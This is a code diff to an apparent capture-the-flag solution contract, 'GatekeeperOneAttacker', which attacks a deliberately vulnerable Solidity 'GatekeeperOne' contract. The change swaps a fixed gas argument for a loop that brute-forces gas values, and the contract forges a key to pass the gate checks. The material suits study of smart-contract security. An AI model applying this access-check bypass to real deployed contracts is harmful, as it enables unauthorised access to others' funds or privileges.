@@ -39,7 +39,7 @@ contract GatekeeperOne {
 }
 
 contract GatekeeperOneAttacker {
-    function attack(address _gateKeeper, uint256 gas) external {
+    function attack(address _gateKeeper) external {
         GatekeeperOne gateKeeper = GatekeeperOne(_gateKeeper);
         // needs to be conducted through a contract which is already done here
 
@@ -53,9 +53,11 @@ contract GatekeeperOneAttacker {
         uint64 key64 = uint64(1 << 63) + uint64(key16);
 
         bytes8 key = bytes8(key64);
-
         // needs to take up gas so the modulo 8191 results in 0 so a multiple of 8191
-        require(gas < 8191, "gas to high");
-        require(gateKeeper.enter{gas: 8191 * 10 + gas}(key), "failed");
+        for (uint i = 0; i < 8191; i++) {
+            try gateKeeper.enter{gas: 100000 + i}(key) {
+                break;
+            } catch {}
+        }
     }
 }
